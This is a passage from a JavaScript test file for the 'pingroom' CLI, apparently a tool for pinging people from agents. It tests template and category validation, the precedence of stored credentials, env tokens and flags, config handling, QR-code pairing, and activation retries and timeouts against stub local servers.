// CLI to 422 server-side — an outage-shaped failure for what is a usage error.
test('exit 2: live rejects an unknown --template', () => {
  const { status, stderr } = run(['live', 'start', '-c', 'x', '--template', 'progres']);
  assert.equal(status, 2);
  assert.match(stderr, /--template must be one of: .*progress.*matchup/);
});

test('live accepts every documented template name', () => {
  for (const name of ['status', 'steps', 'progress', 'metrics', 'countdown', 'question', 'matchup']) {
    // No transport configured, so a valid template must fall through to the
    // "provide a webhook or a token" usage error, never to a --template one.
    const { stderr } = run(['live', 'start', '-c', 'x', '--template', name]);
    assert.doesNotMatch(stderr, /--template must be one of/, `rejected valid template "${name}"`);
  }
});

test('exit 2: live rejects --category on update', () => {
  const { status, stderr } = run(['live', 'update', '-c', 'x', '--category', 'alert']);
  assert.equal(status, 2);
  assert.match(stderr, /fixed at stream creation/);
});

test('live start sends category=alert for a time-sensitive stream', async () => {
  const received = [];
  const { server, baseUrl } = await startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      received.push(JSON.parse(body));
      res.writeHead(201, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ state: 'started' }));
    });
  });
  try {
    const { status } = await runAsync([
      'live', 'start', '--token', 't', '--room', 'r', '--api', baseUrl,
      '-c', 'incident-1', '--category', 'alert', '-m', '5xx climbing',
    ]);
    assert.equal(status, 0);
    // `alert` is the only urgency lever that does not also demand an ack.
    assert.deepEqual(received[0].live_status, {
      state: 'running', category: 'alert', message: '5xx climbing',
    });
  } finally {
    server.close();
  }
});

// ---------------------------------------------------------------------------
// Connecting: credential store, config, pairing, logout
// ---------------------------------------------------------------------------

/** A fresh, isolated PINGROOM_HOME. */
function newHome() {
  return mkdtempSync(join(tmpdir(), 'pingroom-home-'));
}

/** Seed a credentials.json the way a completed pairing would have written it. */
function seedCredential(home, cred) {
  writeFileSync(join(home, 'credentials.json'), `${JSON.stringify({ version: 1, ...cred })}\n`, { mode: 0o600 });
}

function activationEnsureResponse(expiresAt = '2099-01-01T00:00:00Z') {
  return {
    status: 201,
    body: {
      onboarded: true,
      replayed: false,
      room: { id: 'room-1', name: 'Project X', invite_code: 'ABC123', is_agent_inbox: false },
      question: {
        id: 'q-onboard',
        kind: 'question',
        prompt: 'PingRoom connected. Can you answer this?',
        state: 'pending',
        options: [{ value: 'yes', label: 'Yes' }],
        expires_at: expiresAt,
        created_at: '2026-08-09T00:00:00Z',
      },
    },
  };
}

function confirmedActivationResponse(overrides = {}) {
  return {
    status: 200,
    body: {
      id: 'q-onboard',
      kind: 'question',
      state: 'answered',
      answer: {
        value: 'yes', label: 'Yes', text: null,
        responder: { id: 'u1', display_name: 'Mahdi' }, answered_at: '2026-08-09T00:01:00Z',
      },
      activation_completed: true,
      ...overrides,
    },
  };
}

/**
 * Stub the pairing endpoints. `statuses` is consumed one entry per poll; the
 * last entry repeats. `rounds` counts how many times pairing was restarted.
 */
function pairingServer(statuses, { onRegister, ensureResponses, waitResponses } = {}) {
  const received = [];
  let poll = 0;
  let ensureCall = 0;
  let waitCall = 0;
  const ensureSequence = ensureResponses ?? [activationEnsureResponse()];
  const waitSequence = waitResponses ?? [confirmedActivationResponse()];
  return startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      const path = req.url.split('?')[0];
      received.push({ method: req.method, path, auth: req.headers['authorization'], body, at: Date.now() });
      let out;
      if (path === '/api/agent/auth') {
        if (onRegister) onRegister();
        out = { status: 200, body: { credential: 'pre_claim_jwt', credential_type: 'pre_claim', expires_in: 900, scopes: [] } };
      } else if (path === '/api/agent/auth/pair/start') {
        out = {
          status: 200,
          body: {
            pair_token: 'p'.repeat(64),
            pair_url: `https://pingroom.io/app/agents/pair?token=${'p'.repeat(64)}`,
            expires_in: 900,
            poll_interval_ms: 10,
          },
        };
      } else if (path === '/api/agent/auth/pair/status') {
        out = { status: 200, body: statuses[Math.min(poll++, statuses.length - 1)] };
      } else if (path === '/api/agent/inbox/ensure') {
        out = ensureSequence[Math.min(ensureCall++, ensureSequence.length - 1)];
      } else if (path === '/api/agent/handoffs/q-onboard/wait') {
        out = waitSequence[Math.min(waitCall++, waitSequence.length - 1)];
      } else {
        out = { status: 404, body: { message: 'no route' } };
      }
      res.writeHead(out.status, { 'Content-Type': 'application/json', ...out.headers });
      res.end(JSON.stringify(out.body));
    });
  }).then((s) => ({ ...s, received }));
}

/**
 * Pair, then run `pingroom activate`, and return the activate result.
 *
 * Connecting no longer sends a test Question — the approval the human tapped is
 * the round-trip — so every activation behaviour is now reached through the
 * explicit command. Pairing first is what gives `activate` the saved
 * QR credential (and the origin it is bound to) that it requires.
 */
async function pairThenActivate(home, baseUrl, env = {}, opts = {}) {
  const paired = await runAsync(
    ['--api', baseUrl],
    { PINGROOM_HOME: home, PINGROOM_INTERNAL_TEST_TTY: '1', NODE_ENV: 'test', COLUMNS: '120' },
    { stdin: '1\n' },
  );
  assert.equal(paired.status, 0, paired.stderr);

  return runAsync(['activate', '--api', baseUrl], { PINGROOM_HOME: home, NODE_ENV: 'test', ...env }, opts);
}

const ACTIVE_PAIR = {
  status: 'active',
  credential: 'active_jwt',
  credential_type: 'active',
  expires_in: 0,
  handle: 'agt_ab12cd34ef',
  scopes: ['pingroom:broadcast:send', 'pingroom:handoffs:create'],
  account: { name: 'Mahdi' },
  room: { invite_code: 'ABC123', name: 'Project X' },
};

test('stored credential supplies the token and the room when no env/flag does', async () => {
  const home = newHome();
  seedCredential(home, { token: 'stored_tok', handle: 'agt_x', room: { invite_code: 'ABC123', name: 'Project X' } });
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ABC123/notifications': () => ({ status: 201, body: { id: 'n1' } }),
  });
  try {
    const { status, stdout } = await runAsync(['ping', '--api', baseUrl, '-m', 'hi'], { PINGROOM_HOME: home });
    assert.equal(status, 0);
    assert.match(stdout, /ping sent/);
    assert.equal(received[0].path, '/api/agent/rooms/ABC123/notifications');
    assert.equal(received[0].auth, 'Bearer stored_tok');
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('PINGROOM_TOKEN always wins over the stored credential (CI is unaffected)', async () => {
  const home = newHome();
  seedCredential(home, { token: 'stored_tok', handle: 'agt_x', room: { invite_code: 'ABC123', name: 'Project X' } });
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ABC123/notifications': () => ({ status: 201, body: { id: 'n1' } }),
  });
  try {
    const { status } = await runAsync(['ping', '--api', baseUrl, '-m', 'hi'], { PINGROOM_HOME: home, PINGROOM_TOKEN: 'env_tok' });
    assert.equal(status, 0);
    assert.equal(received[0].auth, 'Bearer env_tok');
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('--token outranks both the env var and the stored credential', async () => {
  const home = newHome();
  seedCredential(home, { token: 'stored_tok', room: { invite_code: 'ABC123' } });
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ABC123/notifications': () => ({ status: 201, body: { id: 'n1' } }),
  });
  try {
    const { status } = await runAsync(
      ['ping', '--api', baseUrl, '-m', 'hi', '--token', 'flag_tok'],
      { PINGROOM_HOME: home, PINGROOM_TOKEN: 'env_tok' },
    );
    assert.equal(status, 0);
    assert.equal(received[0].auth, 'Bearer flag_tok');
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('ping and both live paths refuse to redirect a stored credential to another origin', async () => {
  const home = newHome();
  seedCredential(home, {
    token: 'paired_tok',
    api_url: 'https://issuer.example.test',
    room: { invite_code: 'ABC123' },
  });
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ABC123/notifications': () => ({ status: 201, body: { id: 'n-never' } }),
    'POST /api/agent/rooms/ABC123/live': () => ({ status: 201, body: { success: true, state: 'running' } }),
    'GET /api/agent/rooms/ABC123/live/stream-1': () => ({ status: 200, body: { state: 'running' } }),
  });

  try {
    const commands = [
      ['ping', '--api', baseUrl, '-m', 'hi'],
      ['live', 'start', '--api', baseUrl, '-c', 'stream-1'],
      ['live', 'get', '--api', baseUrl, '-c', 'stream-1'],
    ];
    for (const command of commands) {
      const result = await runAsync(command, { PINGROOM_HOME: home });
      assert.equal(result.status, 2, command.join(' '));
      assert.match(result.stderr, /stored credential is bound/);
      assert.match(result.stderr, /--token or PINGROOM_TOKEN/);
    }
    assert.equal(received.length, 0, 'no direct bearer path may reach the override origin');
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('a corrupt credentials.json degrades to "not connected" instead of crashing', () => {
  const home = newHome();
  try {
    writeFileSync(join(home, 'credentials.json'), 'not json at all');
    const { status, stderr } = run(['ask', '--room', 'ab12cd', '-p', 'Deploy?'], { PINGROOM_HOME: home });
    assert.equal(status, 2);
    assert.match(stderr, /agent token is required/);
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});

test('config set/get/list round-trips and rejects unknown keys and bad values', () => {
  const home = newHome();
  try {
    assert.match(run(['config', 'list'], { PINGROOM_HOME: home }).stdout, /no settings stored/);

    const set = run(['config', 'set', 'default_room', 'ab12cd'], { PINGROOM_HOME: home });
    assert.equal(set.status, 0);
    assert.match(set.stdout, /^default_room=ab12cd$/m);

    assert.equal(run(['config', 'get', 'default_room'], { PINGROOM_HOME: home }).stdout, 'ab12cd\n');
    // Unset keys print nothing and still exit 0, so `$(pingroom config get …)` is safe.
    const unset = run(['config', 'get', 'api_url'], { PINGROOM_HOME: home });
    assert.equal(unset.status, 0);
    assert.equal(unset.stdout, '');

    run(['config', 'set', 'api_url', 'https://api.example.test'], { PINGROOM_HOME: home });
    const listed = run(['config', 'list'], { PINGROOM_HOME: home });
    assert.match(listed.stdout, /^default_room=ab12cd$/m);
    assert.match(listed.stdout, /^api_url=https:\/\/api\.example\.test$/m);

    const unknown = run(['config', 'set', 'nope', 'x'], { PINGROOM_HOME: home });
    assert.equal(unknown.status, 2);
    assert.match(unknown.stderr, /unknown config key/);

    const cleartext = run(['config', 'set', 'api_url', 'http://evil.example'], { PINGROOM_HOME: home });
    assert.equal(cleartext.status, 2);
    assert.match(cleartext.stderr, /must use https/);

    // An empty value clears the key rather than storing "".
    assert.match(run(['config', 'set', 'api_url', ''], { PINGROOM_HOME: home }).stdout, /api_url cleared/);
    assert.equal(run(['config', 'get', 'api_url'], { PINGROOM_HOME: home }).stdout, '');

    const noSub = run(['config'], { PINGROOM_HOME: home });
    assert.equal(noSub.status, 2);
    assert.match(noSub.stderr, /config needs a subcommand/);
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});

test('config default_room fills in for --room, and the flag/env still outrank it', async () => {
  const home = newHome();
  run(['config', 'set', 'default_room', 'cfgroom'], { PINGROOM_HOME: home });
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/cfgroom/questions': () => ({ status: 201, body: { id: 'q_cfg', state: 'pending' } }),
    'POST /api/agent/rooms/envroom/questions': () => ({ status: 201, body: { id: 'q_env', state: 'pending' } }),
    'POST /api/agent/rooms/flagroom/questions': () => ({ status: 201, body: { id: 'q_flag', state: 'pending' } }),
  });
  try {
    const cfg = await runAsync(['ask', '--api', baseUrl, '--token', 't', '-p', 'Go?'], { PINGROOM_HOME: home });
    assert.equal(cfg.status, 0);
    assert.equal(cfg.stdout.trim(), 'q_cfg');

    const env = await runAsync(['ask', '--api', baseUrl, '--token', 't', '-p', 'Go?'], { PINGROOM_HOME: home, PINGROOM_ROOM: 'envroom' });
    assert.equal(env.stdout.trim(), 'q_env');

    const flag = await runAsync(
      ['ask', '--api', baseUrl, '--token', 't', '--room', 'flagroom', '-p', 'Go?'],
      { PINGROOM_HOME: home, PINGROOM_ROOM: 'envroom' },
    );
    assert.equal(flag.stdout.trim(), 'q_flag');
    assert.deepEqual(received.map((r) => r.path), [
      '/api/agent/rooms/cfgroom/questions',
      '/api/agent/rooms/envroom/questions',
      '/api/agent/rooms/flagroom/questions',
    ]);
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('config api_url becomes the API base when no flag or env var is given', async () => {
  const home = newHome();
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q_cfgapi', state: 'pending' } }),
  });
  try {
    // A loopback http base is the one cleartext exception, for local dev.
    run(['config', 'set', 'api_url', baseUrl], { PINGROOM_HOME: home });
    const { status, stdout } = await runAsync(
      ['ask', '--token', 't', '--room', 'ab12cd', '-p', 'Go?'],
      { PINGROOM_HOME: home },
    );
    assert.equal(status, 0);
    assert.equal(stdout.trim(), 'q_cfgapi');
    assert.equal(received.length, 1);
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('bare pingroom prints the connected status and the help', () => {
  const home = newHome();
  seedCredential(home, { token: 'stored_tok', handle: 'agt_ab12cd34ef', room: { invite_code: 'ABC123', name: 'Project X' } });
  try {
    const { status, stdout } = run([], { PINGROOM_HOME: home });
    assert.equal(status, 0);
    assert.match(stdout, /Connected as @agt_ab12cd34ef → #Project X/);
    assert.match(stdout, /Default room: ABC123/);
    assert.match(stdout, /pingroom — send a ping/);
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});

test('the status line reflects a grant wider than one room', () => {
  const cases = [
    {
      cred: { room_access: 'all', room: null, rooms: [] },
      expect: /Connected as @agt_ab12cd34ef → all rooms/,
    },
    {
      cred: {
        room_access: 'selected',
        room: { invite_code: 'ABC123', name: 'Project X' },
        rooms: [{ invite_code: 'ABC123', name: 'Project X' }, { invite_code: 'DEF456', name: 'Ops' }],
      },
      expect: /Connected as @agt_ab12cd34ef → #Project X \+1 more/,
    },
  ];

  for (const { cred, expect } of cases) {
    const home = newHome();
    seedCredential(home, { token: 'stored_tok', handle: 'agt_ab12cd34ef', ...cred });
    try {
      const { status, stdout } = run([], { PINGROOM_HOME: home });
      assert.equal(status, 0);
      assert.match(stdout, expect);
    } finally {
      rmSync(home, { recursive: true, force: true });
    }
  }
});

test('activate explains an all-rooms grant with no delivery room instead of blaming the pairing', () => {
  const home = newHome();
  seedCredential(home, {
    token: 'stored_tok',
    handle: 'agt_ab12cd34ef',
    room: null,
    rooms: [],
    room_access: 'all',
    scopes: ['pingroom:handoffs:create'],
    api_url: 'https://api.pingroom.io',
  });
  try {
    const { status, stderr } = run(['activate'], { PINGROOM_HOME: home });
    assert.equal(status, 2);
    assert.match(stderr, /granted all rooms but no delivery room/);
    assert.match(stderr, /Connected Agents/);
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});

test('bare pingroom reports the env token instead of the stored credential', () => {
  const home = newHome();
  seedCredential(home, { token: 'stored_tok', handle: 'agt_ab12cd34ef' });
  try {
    const { status, stdout } = run([], { PINGROOM_HOME: home, PINGROOM_TOKEN: 'env_tok' });
    assert.equal(status, 0);
    assert.match(stdout, /Using the agent token from PINGROOM_TOKEN/);
    assert.match(stdout, /is ignored while it is set/);
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});

test('non-TTY: bare pingroom never prompts or draws a QR, and points at PINGROOM_TOKEN', () => {
  // spawnSync pipes both streams, so this is exactly the CI shape. It must
  // return immediately rather than block on an invisible prompt.
  const { status, stdout, stderr } = run([]);
  assert.equal(status, 0);
  assert.match(stderr, /not connected/);
  assert.match(stderr, /PINGROOM_TOKEN/);
  assert.match(stdout, /pingroom — send a ping/);
  assert.doesNotMatch(stdout, /[█▄▀]/);
  assert.doesNotMatch(stdout, /Choose \[1\]/);
});

test('non-TTY: a command needing a credential fails with the usage code, not a prompt', () => {
  for (const argv of [['ask', '--room', 'ab12cd', '-p', 'Deploy?'], ['handoff', '-m', 'Ship it']]) {
    const { status, stdout, stderr } = run(argv);
    assert.equal(status, 2, `${argv[0]} should be a usage error`);
    assert.match(stderr, /PINGROOM_TOKEN/);
    assert.doesNotMatch(stdout, /Choose \[1\]/);
  }
});

test('pairing renders a QR, polls to active, and stores a 0600 credential', async () => {
  const home = newHome();
  const { server, baseUrl, received } = await pairingServer([
    { status: 'pending' },
    { status: 'pending' },
    ACTIVE_PAIR,
  ]);
  try {
    const { status, stdout } = await runAsync(
      ['--api', baseUrl],
      { PINGROOM_HOME: home, PINGROOM_INTERNAL_TEST_TTY: '1', NODE_ENV: 'test', COLUMNS: '120' },
      { stdin: '\n' }, // accept the default picker choice (QR)
    );
    assert.equal(status, 0);
    // The QR itself, then the URL fallback, then the confirmation.
    assert.match(stdout, /[█▄▀]{4}/);
    assert.match(stdout, /Or open: https:\/\/pingroom\.io\/app\/agents\/pair\?token=p{64}/);
    assert.match(stdout, /✓ Connected as @agt_ab12cd34ef → #Project X/);
    // Connecting is the whole ceremony: the approval the human just tapped IS
    // the round-trip, so nothing else is sent to their phone.
    assert.doesNotMatch(stdout, /test question/i);

    const paths = received.map((r) => r.path);
    assert.equal(paths[0], '/api/agent/auth');
    assert.equal(paths[1], '/api/agent/auth/pair/start');
    assert.deepEqual(paths.slice(2), Array(3).fill('/api/agent/auth/pair/status'));

    // Anonymous registration, with the scopes the CLI actually uses.
    const register = JSON.parse(received[0].body);
    assert.equal(register.type, 'anonymous');
    assert.ok(register.scopes.includes('pingroom:handoffs:create'));
    assert.ok(register.scopes.includes('pingroom:questions:ask'));
    // --attach uploads through /agent/attachments, which is its own consent
    // scope. Asking for it at pairing is what keeps the flag usable on a
    // QR-paired credential rather than 403ing after the bytes are read.
    assert.ok(register.scopes.includes('pingroom:attachments:write'));
    // pair/start and every poll present the pre-claim credential.
    assert.equal(received[1].auth, 'Bearer pre_claim_jwt');
    assert.deepEqual(JSON.parse(received[1].body).scopes, register.scopes);
    for (const poll of received.slice(2, 5)) assert.equal(poll.auth, 'Bearer pre_claim_jwt');

    const credPath = join(home, 'credentials.json');
    const cred = JSON.parse(readFileSync(credPath, 'utf8'));
    assert.equal(cred.token, 'active_jwt');
    assert.equal(cred.handle, 'agt_ab12cd34ef');
    assert.deepEqual(cred.room, { invite_code: 'ABC123', name: 'Project X' });
    assert.equal(statSync(credPath).mode & 0o777, 0o600);
    assert.equal(statSync(home).mode & 0o777, 0o700);

    // The paired room is the last-resort fallback for --room.
    assert.equal(run(['config', 'get', 'default_room'], { PINGROOM_HOME: home }).stdout, '');
    assert.match(run([], { PINGROOM_HOME: home }).stdout, /Default room: ABC123/);
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('activate keeps the saved connection when Agent Inbox activation cannot start', async () => {
  const home = newHome();
  const { server, baseUrl, received } = await pairingServer([ACTIVE_PAIR], {
    ensureResponses: [{
      status: 409,
      body: { code: 'no_room_configured', message: 'Choose a delivery room in PingRoom.' },
    }],
  });
  try {
    const { status, stdout, stderr } = await pairThenActivate(home, baseUrl);
    assert.equal(status, 1, stderr);
    assert.match(stdout, /Agent Inbox activation is not complete: Choose a delivery room in PingRoom/);
    assert.match(stdout, /connection is saved and usable/);
    assert.match(stdout, /Run "pingroom activate"/);
    assert.equal(JSON.parse(readFileSync(join(home, 'credentials.json'), 'utf8')).token, 'active_jwt');
    assert.equal(received.filter((r) => r.path === '/api/agent/inbox/ensure').length, 1);
    assert.equal(received.filter((r) => r.path.includes('/handoffs/')).length, 0);
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('pingroom activate retries a failed activation with the saved credential', async () => {
  const home = newHome();
  const { server, baseUrl, received } = await pairingServer([ACTIVE_PAIR], {
    ensureResponses: [
      { status: 409, body: { code: 'temporarily_unavailable', message: 'Try again shortly.' } },
      activationEnsureResponse(),
    ],
  });
  try {
    const incomplete = await pairThenActivate(home, baseUrl);
    assert.equal(incomplete.status, 1, incomplete.stderr);
    assert.match(incomplete.stdout, /Run "pingroom activate"/);
    assert.doesNotMatch(incomplete.stdout, /Agent Inbox is ready/);

    const retried = await runAsync(
      ['activate', '--api', baseUrl],
      { PINGROOM_HOME: home, PINGROOM_TOKEN: 'must-not-be-used' },
    );
    assert.equal(retried.status, 0, retried.stderr);
    assert.match(retried.stdout, /Connected as @agt_ab12cd34ef/);
    assert.match(retried.stdout, /Agent Inbox is ready/);

    const ensureCalls = received.filter((request) => request.path === '/api/agent/inbox/ensure');
    assert.equal(ensureCalls.length, 2);
    assert.equal(ensureCalls[0].auth, 'Bearer active_jwt');
    assert.equal(ensureCalls[1].auth, 'Bearer active_jwt');
    assert.deepEqual(JSON.parse(ensureCalls[0].body), {});
    assert.equal(received.filter((request) => request.path === '/api/agent/handoffs/q-onboard/wait').length, 1);
    assert.equal(received.filter((request) => request.path === '/api/agent/auth').length, 1);
    assert.equal(JSON.parse(readFileSync(join(home, 'credentials.json'), 'utf8')).token, 'active_jwt');
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('pingroom activate rejects non-QR or under-scoped saved credentials before HTTP', async () => {
  let requests = 0;
  const { server, baseUrl } = await startServer((req, res) => {
    requests += 1;
    res.writeHead(500, { 'Content-Type': 'application/json' });
    res.end('{}');
  });
  const homes = [];
  try {
    const noCredentialHome = newHome();
    homes.push(noCredentialHome);
    const noCredential = await runAsync(['activate', '--api', baseUrl], { PINGROOM_HOME: noCredentialHome });
    assert.equal(noCredential.status, 2);
    assert.match(noCredential.stderr, /no saved QR-paired credential/);

    const emailHome = newHome();
    homes.push(emailHome);
    seedCredential(emailHome, {
      token: 'email-token', api_url: baseUrl, room: null, scopes: ['pingroom:handoffs:create'],
    });
    const email = await runAsync(['activate', '--api', baseUrl], { PINGROOM_HOME: emailHome });
    assert.equal(email.status, 2);
    assert.match(email.stderr, /no QR-selected delivery room/);

    const underScopedHome = newHome();
    homes.push(underScopedHome);
    seedCredential(underScopedHome, {
      token: 'old-token', api_url: baseUrl, room: { invite_code: 'ABC123' }, scopes: [],
    });
    const underScoped = await runAsync(['activate', '--api', baseUrl], { PINGROOM_HOME: underScopedHome });
    assert.equal(underScoped.status, 2);
    assert.match(underScoped.stderr, /lacks pingroom:handoffs:create/);

    const unboundHome = newHome();
    homes.push(unboundHome);
    seedCredential(unboundHome, {
      token: 'unbound-token', room: { invite_code: 'ABC123' }, scopes: ['pingroom:handoffs:create'],
    });
    const unbound = await runAsync(['activate', '--api', baseUrl], { PINGROOM_HOME: unboundHome });
    assert.equal(unbound.status, 2);
    assert.match(unbound.stderr, /no trusted API origin/);

    const wrongOriginHome = newHome();
    homes.push(wrongOriginHome);
    seedCredential(wrongOriginHome, {
      token: 'issuer-token', api_url: 'https://issuer.example.test',
      room: { invite_code: 'ABC123' }, scopes: ['pingroom:handoffs:create'],
    });
    const wrongOrigin = await runAsync(
      ['activate', '--api', baseUrl],
      { PINGROOM_HOME: wrongOriginHome, PINGROOM_TOKEN: 'explicit-env-token' },
    );
    assert.equal(wrongOrigin.status, 2);
    assert.match(wrongOrigin.stderr, /stored credential is bound to https:\/\/issuer\.example\.test/);

    assert.equal(requests, 0);
  } finally {
    server.close();
    for (const home of homes) rmSync(home, { recursive: true, force: true });
  }
});

test('activate does not claim readiness when an answer lacks confirmed activation', async () => {
  for (const completion of [false, 'missing']) {
    const home = newHome();
    const terminal = {
      id: 'q-onboard',
      kind: 'question',
      state: 'answered',
      answer: {
        value: 'yes', label: 'Yes', text: null,
        responder: { id: 'u1', display_name: 'Mahdi' }, answered_at: '2026-08-09T00:01:00Z',
      },
    };
    if (completion !== 'missing') terminal.activation_completed = completion;
    const { server, baseUrl, received } = await pairingServer([ACTIVE_PAIR], {
      waitResponses: [{ status: 200, body: terminal }],
    });
    try {
      const { status, stdout, stderr } = await pairThenActivate(
        home,
        baseUrl,
        { PINGROOM_INTERNAL_ACTIVATION_TIMEOUT_MS: '2600' },
        { timeoutMs: 7_000 },
      );
      assert.equal(status, 1, stderr);
      assert.match(stdout, /answered without verified phone receipt before the answer/);
      assert.match(stdout, /connection is saved and usable/);
      assert.match(stdout, /run "pingroom activate" to send a fresh test with this saved connection/i);
      assert.doesNotMatch(stdout, /Agent Inbox is ready/);
      assert.equal(JSON.parse(readFileSync(join(home, 'credentials.json'), 'utf8')).token, 'active_jwt');
      const waits = received.filter((request) => request.path === '/api/agent/handoffs/q-onboard/wait');
      assert.equal(waits.length, 1, 'a terminal unverified sequence must not be polled as if history can change');
    } finally {
      server.close();
      rmSync(home, { recursive: true, force: true });
    }
  }
});

test('activate rejects malformed or mismatched activation envelopes without losing credentials', async () => {
  const invalidCases = [
    {
      ensureResponses: [{
        status: 201,
        body: {
          onboarded: true,
          replayed: false,
          room: { id: 'room-1', name: 'Project X', invite_code: 'ABC123', is_agent_inbox: false },
          question: {
            id: '', kind: 'question', prompt: 'Test', state: 'pending', options: [],
            expires_at: null, created_at: null,
          },
        },
      }],
      expected: /incomplete Agent Inbox ensure response/,
    },
    {
      waitResponses: [{
        status: 200,
        body: { id: 'wrong-id', kind: 'question', state: 'pending', answer: null },
      }],
      expected: /mismatched Agent Inbox wait response/,
    },
    {
      waitResponses: [{
        status: 200,
        body: {
          id: 'q-onboard', kind: 'question', state: 'answered',
          answer: { value: 'yes' }, activation_completed: true,
        },
      }],
      expected: /answered activation without a valid answer/,
    },
  ];

  for (const invalid of invalidCases) {
    const home = newHome();
    const { server, baseUrl } = await pairingServer([ACTIVE_PAIR], invalid);
    try {
      const { status, stdout, stderr } = await pairThenActivate(home, baseUrl);
      assert.equal(status, 1, stderr);
      assert.match(stdout, invalid.expected);
      assert.match(stdout, /connection is saved and usable/);
      assert.match(stdout, /Run "pingroom activate"/);
      assert.doesNotMatch(stdout, /Agent Inbox is ready/);
      assert.equal(JSON.parse(readFileSync(join(home, 'credentials.json'), 'utf8')).token, 'active_jwt');
    } finally {
      server.close();
      rmSync(home, { recursive: true, force: true });
    }
  }
});

test('activate honors Retry-After for ensure and wait 429s, then completes activation', async () => {
  const home = newHome();
  const successEnsure = activationEnsureResponse();
  const { server, baseUrl, received } = await pairingServer([ACTIVE_PAIR], {
    ensureResponses: [
      {
        status: 429,
        headers: { 'Retry-After': '0' },
        body: { code: 'rate_limited', message: 'Try again.' },
      },
      successEnsure,
    ],
    waitResponses: [
      {
        status: 429,
        headers: { 'Retry-After': '3' },
        body: { code: 'rate_limited', message: 'Try again.' },
      },
      confirmedActivationResponse(),
    ],
  });
  try {
    // Pair first (untimed), then measure only the activation round trip.
    const paired = await runAsync(
      ['--api', baseUrl],
      { PINGROOM_HOME: home, PINGROOM_INTERNAL_TEST_TTY: '1', NODE_ENV: 'test', COLUMNS: '120' },
      { stdin: '1\n' },
    );
    assert.equal(paired.status, 0, paired.stderr);

    const startedAt = Date.now();
    const { status, stdout, stderr } = await runAsync(
      ['activate', '--api', baseUrl],
      { PINGROOM_HOME: home, NODE_ENV: 'test' },
      { timeoutMs: 8000 },
    );
    assert.equal(status, 0, stderr);
    const elapsed = Date.now() - startedAt;
    assert.ok(elapsed >= 2_900, 'wait retries must honor Retry-After beyond the polling cadence');
    assert.ok(elapsed < 4_500, 'Retry-After should not add the exponential fallback delay');
    assert.match(stdout, /Agent Inbox is ready/);
    const ensures = received.filter((r) => r.path === '/api/agent/inbox/ensure');
    const waits = received.filter((r) => r.path === '/api/agent/handoffs/q-onboard/wait');
    assert.equal(ensures.length, 2);
    assert.ok(ensures[1].at - ensures[0].at < 500, 'ensure should honor Retry-After: 0');
    assert.equal(waits.length, 2);
    assert.ok(waits[1].at - waits[0].at >= 2_900);
    assert.equal(JSON.parse(readFileSync(join(home, 'credentials.json'), 'utf8')).token, 'active_jwt');
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('activate stops at the activation deadline without discarding credentials', async () => {
  const home = newHome();
  const { server, baseUrl, received } = await pairingServer([ACTIVE_PAIR], {
    waitResponses: [{ status: 200, body: { id: 'q-onboard', kind: 'question', state: 'pending' } }],
  });
  try {
    const { status, stdout, stderr } = await pairThenActivate(
      home,
      baseUrl,
      { PINGROOM_INTERNAL_ACTIVATION_TIMEOUT_MS: '100' },
      { timeoutMs: 3000 },
    );
    assert.equal(status, 1, stderr);
    assert.match(stdout, /still waiting for the test answer/);
    assert.match(stdout, /connection is saved and usable/);
    assert.match(stdout, /Run "pingroom activate"/);
    assert.equal(received.filter((r) => r.path === '/api/agent/handoffs/q-onboard/wait').length, 1);
    assert.equal(JSON.parse(readFileSync(join(home, 'credentials.json'), 'utf8')).token, 'active_jwt');
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('pairing offers a fresh QR when the pre-claim window expires', async () => {
  const home = newHome();
  let rounds = 0;
  // First poll expires; after the user accepts a restart the new round is live.
  const { server, baseUrl, received } = await pairingServer(
    [{ status: 'expired' }, ACTIVE_PAIR],
    { onRegister: () => { rounds += 1; } },
  );
  try {
    const { status, stdout } = await runAsync(
      ['--api', baseUrl],
      { PINGROOM_HOME: home, PINGROOM_INTERNAL_TEST_TTY: '1', NODE_ENV: 'test', COLUMNS: '120' },
      { stdin: '1\ny\n' },
    );
    assert.equal(status, 0);
    assert.match(stdout, /That code expired\./);
    assert.match(stdout, /Show a fresh QR code\?/);
    assert.match(stdout, /✓ Connected as @agt_ab12cd34ef/);
    assert.equal(rounds, 2, 'a restart must mint a brand new pre-claim registration');
    assert.equal(received.filter((r) => r.path === '/api/agent/auth/pair/start').length, 2);
    assert.equal(JSON.parse(readFileSync(join(home, 'credentials.json'), 'utf8')).token, 'active_jwt');
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('declining a fresh QR exits 3 and writes no credential', async () => {
  const home = newHome();
  const { server, baseUrl } = await pairingServer([{ status: 'expired' }]);
  try {
    const { status, stdout } = await runAsync(
      ['--api', baseUrl],
      { PINGROOM_HOME: home, PINGROOM_INTERNAL_TEST_TTY: '1', NODE_ENV: 'test', COLUMNS: '120' },
      { stdin: '1\nn\n' },
    );
    assert.equal(status, 3);
    assert.match(stdout, /That code expired\./);
